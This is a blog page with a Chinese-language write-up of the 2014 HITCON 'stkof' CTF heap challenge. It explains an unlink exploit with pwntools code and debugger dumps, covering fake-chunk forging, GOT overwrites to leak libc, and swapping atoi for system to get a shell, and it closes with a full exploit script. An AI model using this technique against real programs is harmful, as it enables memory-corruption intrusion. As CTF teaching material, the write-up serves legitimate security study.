@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Unlink - 2014 HITCON stkof"/>
+
+
+
+
+
+
+
+
+    <link rel="alternate" href="/default" title="Boxer">
+
+
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1"/>
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/02/12/unlink-stkof/"/>
+
+
+<meta name="description" content="CTF-Wiki中看到的一个案例，利用方法是Unlink。由于CTF-Wiki中写的相当简略，忽略了很多细节，所以写这篇文章对其进行补充。 checksec1234567life@ubuntu:~&#x2F;ctf&#x2F;heap&#x2F;2014_hitcon_stkof$ checksec stkof[*] &#39;&#x2F;home&#x2F;life&#x2F;ctf&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink - 2014 HITCON stkof">
+<meta property="og:url" content="http://yoursite.com/2020/02/12/unlink-stkof/index.html">
+<meta property="og:site_name" content="Boxer">
+<meta property="og:description" content="CTF-Wiki中看到的一个案例，利用方法是Unlink。由于CTF-Wiki中写的相当简略，忽略了很多细节，所以写这篇文章对其进行补充。 checksec1234567life@ubuntu:~&#x2F;ctf&#x2F;heap&#x2F;2014_hitcon_stkof$ checksec stkof[*] &#39;&#x2F;home&#x2F;life&#x2F;ctf&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/image/15815225291149.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15815227199822.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15815255140312.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15815265470326.jpg">
+<meta property="article:published_time" content="2020-02-12T15:09:35.268Z">
+<meta property="article:modified_time" content="2020-02-13T05:59:51.037Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/image/15815225291149.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1"/>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+    <title> Unlink - 2014 HITCON stkof - Boxer </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Boxer</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="https://github.com/songjianyang" target="_blank" rel="noopener">
+                            
+                            
+                                Github
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/Links">
+                            
+                            
+                                Links
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                
+            </ul>
+        
+    </nav>
+
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Unlink - 2014 HITCON stkof
+        
+      </h1>
+
+      <time class="post-time">
+          2020-02-12
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>CTF-Wiki中看到的一个案例，利用方法是Unlink。<br>由于CTF-Wiki中写的相当简略，忽略了很多细节，所以写这篇文章对其进行补充。</p>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">life@ubuntu:~&#x2F;ctf&#x2F;heap&#x2F;2014_hitcon_stkof$ checksec stkof</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;life&#x2F;ctf&#x2F;heap&#x2F;2014_hitcon_stkof&#x2F;stkof&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>64位程序，开启了Canary和NX保护，Partial RELRO说明我们可以对GOT进行改写。</p>
+<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>拖入IDA分析，该程序会根据输入的数字来进行对应的操作。</p>
+<p>数字1：进入alloc函数，malloc指定大小的chunk，保存malloc的指针到globals[]数组里，位于bss段。<br>数字2：进入fill函数，根据id，从globals数组中选择相应的chunk，写入size长度的数据，造成堆溢出。<br>数字3：根据id，free对应的chunk，并把globals[id]清空。</p>
+<h3 id="Unlink-利用条件"><a href="#Unlink-利用条件" class="headerlink" title="Unlink 利用条件"></a>Unlink 利用条件</h3><ol>
+<li>需要一块small bin大小的chunk，用于触发unlink。</li>
+<li>绕过Unlink的__builtin_expect检查。</li>
+<li>通过堆溢出修改下一个chunk的inuse位为0。</li>
+</ol>
+<h3 id="步骤1、分配chunk"><a href="#步骤1、分配chunk" class="headerlink" title="步骤1、分配chunk"></a>步骤1、分配chunk</h3><p>先在exp中定义一个alloc，用来申请size大小的chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'OK\n'</span>)</span><br></pre></td></tr></table></figure>
+<p>然后申请三个chunk，并查看内存布局。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
+<p>chunk1会夹杂在fgets和printf的缓冲区之中。</p>
+<p>所以我们不需要chunk1，只利用chunk2和chunk3即可。</p>
+<p>这是chunk2和chunk3：<br><img src="/image/15815225291149.jpg" alt=""></p>
+<p>我们后面就会用这两个chunk进行unlink。</p>
+<h3 id="步骤2、进行unlink"><a href="#步骤2、进行unlink" class="headerlink" title="步骤2、进行unlink"></a>步骤2、进行unlink</h3><p>由于已经分配了3个chunk，现在查看一下globals数组：</p>
+<p><img src="/image/15815227199822.jpg" alt=""></p>
+<p>数组中保存是chunk的mem地址，分别对应分配的三个chunk。</p>
+<p>unlink的思路是：</p>
+<ol>
+<li>通过堆溢出，在chunk2上创造一个fake_chunk。</li>
+<li>那么fake_chunk的P地址也就是0xe05940。</li>
+<li>然后需要绕过unlink的检查机制，要求FD-&gt;bk要等于P，BK-fd也得等于P，否则就会报错。</li>
+<li>因为P是0xe05940，我们可以利用globals中的第2个数组，因为这里本来存储的就是chunk2的mem。</li>
+<li>最后再通过溢出，将chunk3的size的inuse位改成0，表示fake_chunk已经是空闲状态，可以进行合并。</li>
+</ol>
+<p>然后定义数字2的函数，用于向堆中写数据，进行堆溢出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,size,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(<span class="string">'OK\n'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>fake_chunk:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = p64(<span class="number">0x0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x602150</span><span class="number">-0x18</span>) <span class="comment">#fd</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x602150</span><span class="number">-0x10</span>) <span class="comment">#bk</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>) <span class="comment">#用于绕过nextsize大小检查。</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>) <span class="comment">#prev_size</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment">#通过堆溢出，将inuse改成0</span></span><br></pre></td></tr></table></figure>
+
+<p>向chunk2中写入fake_chunk:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br></pre></td></tr></table></figure>
+
+<p>此时chunk2的布局如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20xg 0xe05930</span><br><span class="line">0xe05930:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xe05940:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xe05950:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0xe05960:	0x0000000000000020	0x0000000000000000</span><br><span class="line">0xe05970:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0xe05980:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xe05990:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xe059a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xe059b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xe059c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br></pre></td></tr></table></figure>
+<p>然后我们free第3个chunk，程序就会进入unlink函数，检查FD-&gt;bk和BK-&gt;fd是不是等于0xe05940。</p>
+<p>我们在fd上写的0x602138，它的bk就是+0x18，是0x602150，所以绕过了检查。BK位置同理。</p>
+<p>最后的效果：<br>FD-&gt;bk = BK; </p>
+<ul>
+<li>*(0x602138+0x18)  = 0x602140</li>
+</ul>
+<p>BK-&gt;fd = FD;  </p>
+<ul>
+<li>*(0x602140+0x10)  = 0x602138</li>
+</ul>
+<p>globals[2]的位置变成了 0x602138</p>
+<p><img src="/image/15815255140312.jpg" alt=""></p>
+<p>改了它的好处就是，0x602138现在就是chunk2的指针了，以后再向chunk2写数据，就相当于写到了globals数组中。</p>
+<h3 id="步骤3、泄露libc地址"><a href="#步骤3、泄露libc地址" class="headerlink" title="步骤3、泄露libc地址"></a>步骤3、泄露libc地址</h3><p>我们可以将globals[1]的位置改为free@got地址，然后调用edit向chunk1写数据，就相当于向free@got中写。</p>
+<p>我们将free@got改成puts@plt，这样下次再调用free的时候就会puts出地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x602018</span>) <span class="comment"># free@got.plt globals[1]</span></span><br><span class="line">payload += p64(<span class="number">0x602020</span>) <span class="comment"># puts@got.plt globals[2]</span></span><br><span class="line">payload += p64(<span class="number">0x602088</span>) <span class="comment"># atoi@got.plt globals[3]</span></span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>
+<p>现在globals[1]是free@got，将其写入puts@plt。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,len(p64(<span class="number">0x400760</span>)),p64(<span class="number">0x400760</span>)) <span class="comment">#puts@plt</span></span><br></pre></td></tr></table></figure>
+<p>再次调用free，相当于调用了puts，打印了puts@got中的libc地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤4、system"><a href="#步骤4、system" class="headerlink" title="步骤4、system"></a>步骤4、system</h3><p>接收puts的libc地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = p.recvuntil(<span class="string">'\nOK\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(puts_addr + <span class="string">'\x00\x00'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>有了libc地址就可以执行system了。</p>
+<p>计算system的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>将atoi@got.plt改成system地址，下次需要输入的时候，直接输入/bin/sh即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,len(p64(system_addr)),p64(system_addr))</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/15815265470326.jpg" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>先分配三个chunk。</li>
+<li>利用edit在chunk2中写入fake_chunk，用来触发unlink。</li>
+<li>通过unlink将globals[2]的内容改为&amp;globals[2]-0x18，也就是globals[-1]。</li>
+<li>将globals[1]改为，free@got</li>
+<li>将globals[2]改为，puts@got</li>
+<li>将globals[3]改为，atoi@got</li>
+<li>修改free@got的地址为puts@plt</li>
+<li>再次调用free，相当于调用了puts，打印出libc地址。</li>
+<li>利用得到的libc地址计算出system地址。</li>
+<li>将atoi@got改为system地址。</li>
+<li>下次要输入的时候，直接输入/bin/sh即可。</li>
+</ol>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,size,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配chunk</span></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行unlink</span></span><br><span class="line">fake_chunk = p64(<span class="number">0x0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x602150</span><span class="number">-0x18</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x602150</span><span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">payload = p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x602018</span>)</span><br><span class="line">payload += p64(<span class="number">0x602020</span>)</span><br><span class="line">payload += p64(<span class="number">0x602088</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,len(p64(<span class="number">0x400760</span>)),p64(<span class="number">0x400760</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收puts地址</span></span><br><span class="line">puts_addr = p.recvuntil(<span class="string">'\nOK\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(puts_addr + <span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算libc</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">edit(<span class="number">3</span>,len(p64(system_addr)),p64(system_addr))</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2020
+    <span class="footer-author">.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple" target="_blank" rel="noopener">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    
+
+  
+ 
+  </script>
+  </body>
+</html>
